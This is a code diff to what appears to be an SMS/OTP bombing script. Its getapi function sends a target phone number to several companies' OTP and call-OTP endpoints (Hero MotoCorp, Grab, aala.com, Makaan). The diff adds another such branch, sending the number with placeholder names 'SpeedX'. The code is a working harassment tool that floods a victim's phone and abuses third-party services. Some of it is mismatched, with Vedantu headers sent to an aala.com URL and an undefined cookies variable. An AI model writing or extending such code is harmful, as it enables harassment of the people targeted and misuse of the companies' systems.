@@ -356,6 +356,7 @@ def getapi(pn,lim,cc):
         response = requests.post('https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php', headers=headers, cookies=cookies, data=data)
 
         return response.status_code==200
+    
     elif lim == 5:
         cookies = {
             'Cookie:_ga': 'GA1.2.1483885314.1559157646',
@@ -663,6 +664,29 @@ def getapi(pn,lim,cc):
         }
 
         response = requests.post('https://api.grab.com/grabid/v1/phone/otp', data=data)
+        return True
+    elif lim == 17:
+    
+        headers = {
+            'authority': 'user.vedantu.com',
+            'content-length': '74',
+            'content-type': 'application/json',
+            'origin': ' https://www.vedantu.com',
+            'sec-fetch-site': 'same-site',
+            'sec-fetch-mode': 'cors',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
+            'Referer': 'https://www.vedantu.com/',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5',
+        }
+
+        data = {
+          'email': cc+pn,
+          'firstname': 'SpeedX',
+          'lastname': 'SpeedX'
+        }
+
+        response = requests.post('https://www.aala.com/accustomer/ajax/getOTP', headers=headers, cookies=cookies, json=data)
         return True
     elif lim == 100:
         rd = os.popen('curl -s -X GET "https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/' +
